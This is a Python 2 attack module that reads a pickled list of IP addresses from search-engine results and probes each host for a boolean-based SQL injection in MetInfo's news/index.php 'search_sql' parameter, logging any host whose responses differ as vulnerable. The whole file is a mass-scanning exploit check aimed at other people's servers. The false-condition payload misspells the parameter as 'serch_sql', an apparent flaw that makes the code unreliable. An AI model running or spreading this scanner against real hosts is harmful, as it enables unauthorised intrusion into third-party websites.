#!/bin/env python
#encoding:utf-8

import re
import sys
sys.path.append("../../")
import urllib2
import json
import pickle,pprint

from lib.core.data import logger


def readSearchResult(file):
	f = open(file,"rb")
	data = pickle.load(f)
	#pprint.pprint(data)
	f.close()
	return data

def attack(url):
	a = "http://{target}/news/index.php?".format(target=url)

	playLoadTrue = "http://{target}/news/index.php?"\
			"search_sql=%20123qwe%20"\
			"where%201234%3D1234%20--%20x&imgproduct=xxxx".format(target=url)

	playLoadFalse = "http://{target}/news/index.php?"\
			"serch_sql=%20123qwe%20"\
			"where%201234%3D1235%20--%20x&imgproduct=xxxx".format(target=url)
	try:
		req = urllib2.Request(playLoadTrue)
		resp = urllib2.urlopen(req)
		if resp.code != 200:
			return
		data_true = resp.read()

		#print data_true
		if not re.search(r'href=["\' ]shownews\.php\?lang=', data_true, re.M):
				return

		req = urllib2.Request(playLoadFalse)
		resp = urllib2.urlopen(req)
		if resp.code != 200:
			return
		data_false = resp.read()
		#print data_false

		if re.search(r'href=["\' ]shownews\.php\?lang=', data_false, re.M):
			return

		logger.info("%s is vulnerable!" % url)
	except:
		pass

def main(file):
	logger.info("Attack module MetInfo is running")
	ip_list = []
	data = readSearchResult(file)
	for x in data['matches']:
		logger.info("find ip:{0}".format( x['ip']))
		ip_list.append(x['ip'])
	for ip in ip_list:
		attack(ip)
